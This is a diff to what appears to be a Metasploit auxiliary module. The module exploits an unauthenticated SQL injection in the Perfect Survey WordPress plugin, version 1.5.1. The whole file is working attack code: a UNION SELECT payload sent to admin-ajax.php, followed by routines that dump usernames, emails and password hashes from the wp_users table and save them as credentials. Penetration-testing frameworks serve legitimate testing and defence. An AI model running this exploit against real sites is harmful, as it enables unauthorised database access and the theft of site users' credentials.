@@ -1,10 +1,14 @@
-##
+## 
 # This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
 class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::SQLi
+  prepend Msf::Exploit::Remote::AutoCheck
+
+  GET_SQLI_OBJECT_FAILED_ERROR_MSG = 'Unable to successfully retrieve an SQLi object'.freeze
 
   def initialize(info = {})
     super(
@@ -14,8 +18,8 @@ class MetasploitModule < Msf::Auxiliary
         'Description' => %q{
           This module exploits a SQL injection vulnerability in the Perfect Survey
           plugin for WordPress (version 1.5.1). An unauthenticated attacker can
-          exploit the SQLi to retrieve sensitive information such as usernames
-          and password hashes from the `wp_users` table.
+          exploit the SQLi to retrieve sensitive information such as usernames,
+          emails, and password hashes from the `wp_users` table.
         },
         'Author' => [
           'Aaryan Golatkar', # Metasploit Module Creator
@@ -37,51 +41,86 @@ class MetasploitModule < Msf::Auxiliary
 
     register_options([
       OptString.new('TARGETURI', [true, 'Base path to the WordPress installation', '/']),
-      OptBool.new('SHOW_FULL_RESPONSE', [false, 'Show the entire JSON response if username and password hash are not extracted', false]),
       Opt::RPORT(80) # Default port for HTTP
     ])
   end
 
+  # Define SQLi object
+  def get_sqli_object
+    create_sqli(dbms: MySQLi::Common, opts: { hex_encode_strings: true }) do |payload|
+      endpoint = normalize_uri(target_uri.path, 'wp-admin', 'admin-ajax.php')
+      sqli_payload = "1 union select 1,1,char(116,101,120,116),(#{payload}),0,0,0,null,null,null,null,null,null,null,null,null from wp_users"
+      params = {
+        'action' => 'get_question',
+        'question_id' => sqli_payload
+      }
+
+      # Send HTTP GET request
+      res = send_request_cgi({
+        'uri' => endpoint,
+        'method' => 'GET',
+        'vars_get' => params
+      })
+
+      # Validate response
+      return GET_SQLI_OBJECT_FAILED_ERROR_MSG unless res
+      return GET_SQLI_OBJECT_FAILED_ERROR_MSG unless res.code == 200
+
+      html_content = res.get_json_document['html']
+      fail_with(Failure::Unknown, 'HTML content is empty') unless html_content
+
+      # Extract data from response
+      match_data = /survey_question_p">([^<]+)/.match(html_content)
+      return GET_SQLI_OBJECT_FAILED_ERROR_MSG unless match_data
+
+      extracted_data = match_data.captures[0]
+      return GET_SQLI_OBJECT_FAILED_ERROR_MSG unless extracted_data
+
+      extracted_data
+    end
+  end
+
+  # Check method
+  def check
+    @sqli = get_sqli_object
+    return Exploit::CheckCode::Unknown(GET_SQLI_OBJECT_FAILED_ERROR_MSG) if @sqli == GET_SQLI_OBJECT_FAILED_ERROR_MSG
+    return Exploit::CheckCode::Vulnerable if @sqli.test_vulnerable
+
+    Exploit::CheckCode::Safe
+  end
+
+  # Run method
   def run
     print_status('Exploiting SQLi in Perfect Survey plugin...')
+    @sqli ||= get_sqli_object
+    fail_with(Failure::UnexpectedReply, GET_SQLI_OBJECT_FAILED_ERROR_MSG) if @sqli == GET_SQLI_OBJECT_FAILED_ERROR_MSG
 
-    # The vulnerable endpoint
-    endpoint = normalize_uri(target_uri.path, 'wp-admin', 'admin-ajax.php')
+    creds_table = Rex::Text::Table.new(
+      'Header' => 'WordPress User Credentials',
+      'Indent' => 1,
+      'Columns' => ['Username', 'Email', 'Hash']
+    )
 
-    # SQL injection payload
-    sqli_payload = '1 union select 1,1,char(116,101,120,116),user_login,user_pass,0,0,null,null,null,null,null,null,null,null,null from wp_users'
-
-    # HTTP GET request parameters
-    params = {
-      'action' => 'get_question',
-      'question_id' => sqli_payload
-    }
-
-    # Send the request
-    res = send_request_cgi({
-      'uri' => endpoint,
-      'method' => 'GET',
-      'vars_get' => params
-    })
-
-    fail_with(Failure::Unreachable, 'Connection failed') unless res
-    fail_with(Failure::Unknown, 'Unexpected reply from the server') unless res.code == 200
-
-    print_status('Received a response from the server!')
-
-    html_content = res.get_json_document['html']
-    fail_with(Failure::Unknown, 'HTML content is empty') unless html_content
-
-    # Use regex to extract username and the password hash
-    match_data = /survey_question_p">([^<]+)[^$]+(\$P\$[^"]+)/.match(html_content)
-    if match_data
-      username, password_hash = match_data.captures
-      print_good("Extracted credentials: #{username}:#{password_hash}")
-    else
-      print_warning('Could not extract username and password hash. Try enabling SHOW_FULL_RESPONSE.')
-      print_status("Full Response (HTML):\n#{html_content}") if datastore['SHOW_FULL_RESPONSE']
+    print_status("Extracting credential information\n")
+    users = @sqli.dump_table_fields('wp_users', %w[user_login user_email user_pass])
+    users.each do |(username, email, hash)|
+      creds_table << [username, email, hash]
+      create_credential({
+        workspace_id: myworkspace_id,
+        origin_type: :service,
+        module_fullname: fullname,
+        username: username,
+        private_type: :nonreplayable_hash,
+        jtr_format: Metasploit::Framework::Hashes.identify_hash(hash),
+        private_data: hash,
+        service_name: 'WordPress Perfect Survey Plugin',
+        address: datastore['RHOSTS'],
+        port: datastore['RPORT'],
+        protocol: 'tcp',
+        status: Metasploit::Model::Login::Status::UNTRIED,
+        email: email
+      })
     end
-  rescue JSON::ParserError => e
-    fail_with(Failure::UnexpectedReply, "Failed to parse response as JSON: #{e.message}")
+    print_line creds_table.to_s
   end
 end
